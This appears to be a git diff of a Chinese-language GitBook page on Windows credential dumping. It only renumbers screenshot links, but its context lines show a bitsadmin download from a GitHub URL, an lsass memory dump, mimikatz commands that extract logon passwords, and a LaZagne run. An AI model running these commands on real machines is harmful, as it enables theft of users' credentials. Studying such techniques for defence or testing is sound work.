@@ -22,7 +22,7 @@ bitsadmin /rawreturn /transfer getfile https://raw.githubusercontent.com/klionse
 dump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 
-![](../../.gitbook/assets/image%20%28440%29.png)
+![](../../.gitbook/assets/image%20%28442%29.png)
 
 接着,再在本地用 mimikatz.exe 去加载读取即可\[版本保持一致\]
 
@@ -30,7 +30,7 @@ dump.exe -accepteula -ma lsass.exe lsass.dmp
 mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
 ```
 
-![](../../.gitbook/assets/image%20%28441%29.png)
+![](../../.gitbook/assets/image%20%28443%29.png)
 
 ## 3、powershell
 
@@ -102,7 +102,7 @@ mimikatz.exe "sekurlsa::minidump debug596" "sekurlsa::logonPasswords full" "exit
 
 下载直接运行`lazgne.exe all`
 
-![](../../.gitbook/assets/image%20%28443%29.png)
+![](../../.gitbook/assets/image%20%28445%29.png)
 
 ![](../../.gitbook/assets/image%20%28433%29.png)
 
